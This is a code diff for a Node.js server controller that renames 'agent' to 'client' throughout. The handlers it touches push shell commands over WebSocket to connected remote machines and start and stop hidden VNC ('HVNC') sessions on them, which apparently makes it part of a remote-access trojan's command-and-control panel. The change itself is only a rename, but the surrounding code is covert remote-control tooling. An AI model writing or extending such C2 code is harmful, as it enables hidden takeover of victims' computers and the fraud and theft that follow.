@@ -121,12 +121,12 @@ exports.sendCommand = catchAsync(async (req, res, next) => {
   // Generate command ID
   const commandId = `cmd_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
 
-  // Get WebSocket connection for this agent
+  // Get WebSocket connection for this client
   const wsHandler = require('../configs/ws.handler');
-  const agentConnection = wsHandler.getAgentConnection(agent.uuid);
+  const clientConnection = wsHandler.getClientConnection(agent.uuid);
 
-  if (!agentConnection) {
-    return next(new AppError('Agent WebSocket connection not found', 400));
+  if (!clientConnection) {
+    return next(new AppError('Client WebSocket connection not found', 400));
   }
 
   // Prepare command payload based on platform
@@ -153,9 +153,9 @@ exports.sendCommand = catchAsync(async (req, res, next) => {
       commandPayload.shell = 'sh';
   }
 
-  // Send command to agent via WebSocket
+  // Send command to client via WebSocket
   try {
-    agentConnection.send(JSON.stringify(commandPayload));
+    clientConnection.send(JSON.stringify(commandPayload));
     
     // Store command in database for tracking
     await Client.findByIdAndUpdate(agentId, {
@@ -212,16 +212,16 @@ exports.startHvncSession = catchAsync(async (req, res, next) => {
   
   // Get WebSocket connection
   const wsHandler = require('../configs/ws.handler');
-  const agentConnection = wsHandler.getAgentConnection(agent.uuid);
+  const clientConnection = wsHandler.getClientConnection(agent.uuid);
   
-  if (!agentConnection) {
-    return next(new AppError('Agent WebSocket connection not found', 400));
+  if (!clientConnection) {
+    return next(new AppError('Client WebSocket connection not found', 400));
   }
   
   // Generate session ID
   const sessionId = `hvnc_${agent.uuid}_${Date.now()}`;
   
-  // Send HVNC start command to agent
+  // Send HVNC start command to client
   const hvncCommand = {
     type: 'hvnc_start',
     sessionId,
@@ -233,7 +233,7 @@ exports.startHvncSession = catchAsync(async (req, res, next) => {
   };
   
   try {
-    agentConnection.send(JSON.stringify(hvncCommand));
+    clientConnection.send(JSON.stringify(hvncCommand));
     
     // Update agent with HVNC session info
     await Client.findByIdAndUpdate(agentId, {
@@ -279,17 +279,17 @@ exports.stopHvncSession = catchAsync(async (req, res, next) => {
   
   // Get WebSocket connection
   const wsHandler = require('../configs/ws.handler');
-  const agentConnection = wsHandler.getAgentConnection(agent.uuid);
+  const clientConnection = wsHandler.getClientConnection(agent.uuid);
   
-  if (agentConnection && agent.hvncSession) {
-    // Send HVNC stop command to agent
+  if (clientConnection && agent.hvncSession) {
+    // Send HVNC stop command to client
     const hvncCommand = {
       type: 'hvnc_stop',
       sessionId: agent.hvncSession.sessionId
     };
     
     try {
-      agentConnection.send(JSON.stringify(hvncCommand));
+      clientConnection.send(JSON.stringify(hvncCommand));
     } catch (wsError) {
       console.error('Failed to send HVNC stop command:', wsError);
     }
